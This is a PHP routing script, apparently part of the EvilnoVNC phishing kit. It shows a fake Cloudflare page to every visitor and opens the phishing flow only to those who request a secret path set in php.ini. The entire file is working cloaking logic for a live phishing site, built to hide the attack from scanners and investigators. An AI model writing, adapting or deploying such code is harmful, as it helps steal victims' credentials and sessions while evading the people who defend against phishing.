<?php
/**
 * EvilnoVNC router: base URL -> fake Cloudflare page; secret path -> phishing flow.
 * Secret path is read from php.ini SECRET_PATH (default: 12098e2fklj.html).
 */
$requestUri = $_SERVER['REQUEST_URI'] ?? '/';
$path = parse_url($requestUri, PHP_URL_PATH) ?? '/';
$path = '/' . trim($path, '/');
if ($path === '//') {
    $path = '/';
}

// Only the exact secret path gets the phishing flow; everything else (including /) gets the fake page.
$config = @parse_ini_file(__DIR__ . '/php.ini', false);
$secretPath = isset($config['SECRET_PATH']) ? trim($config['SECRET_PATH']) : '12098e2fklj.html';
$secretPath = ltrim($secretPath, '/');
$secretPathFull = ($secretPath !== '') ? '/' . $secretPath : null;

// Phishing flow only for the exact secret path (never for / or empty path)
if ($secretPathFull !== null && $path === $secretPathFull) {
    require __DIR__ . '/index.php';
    return true;
}

// Base URL and any other path: serve fake Cloudflare page
$fakePath = __DIR__ . '/CloudflareFake.html';
if (is_readable($fakePath)) {
    header('Content-Type: text/html; charset=utf-8');
    readfile($fakePath);
} else {
    header('HTTP/1.0 404 Not Found');
    echo 'Not Found';
}
// Return true so the server uses our output; return false would make it serve the requested file (e.g. index.php for /)
return true;
